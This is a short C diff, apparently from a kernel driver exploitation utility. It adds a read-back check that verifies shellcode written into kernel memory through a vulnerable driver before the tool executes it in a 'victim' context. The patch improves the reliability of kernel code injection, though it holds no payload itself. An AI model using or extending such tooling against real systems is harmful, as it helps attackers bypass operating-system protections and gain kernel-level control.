@@ -673,6 +673,33 @@ BOOL KDUpMapDriverPhysicalTranslate(
         }
 
         //
+        // Read the payload back before executing it.
+        //
+        // A partial or misplaced write would otherwise be executed as code, which on
+        // newer NT builds shows up as an illegal instruction or divide error inside
+        // the victim instead of a clean failure. Verify first, execute second.
+        //
+        {
+            PVOID verifyBuffer = supHeapAlloc(ScSize);
+
+            if (verifyBuffer) {
+
+                if (prov->Callbacks.ReadKernelVM(deviceHandle, targetAddress, verifyBuffer, ScSize) &&
+                    RtlCompareMemory(verifyBuffer, ScBuffer, ScSize) != ScSize) {
+
+                    supPrintfEvent(kduEventError,
+                        "[!] Shellcode readback mismatch at 0x%llX, refusing to execute\r\n",
+                        targetAddress);
+
+                    supHeapFree(verifyBuffer);
+                    break;
+                }
+
+                supHeapFree(verifyBuffer);
+            }
+        }
+
+        //
         // Execute shellcode.
         //
         printf_s("[+] Executing shellcode\r\n");
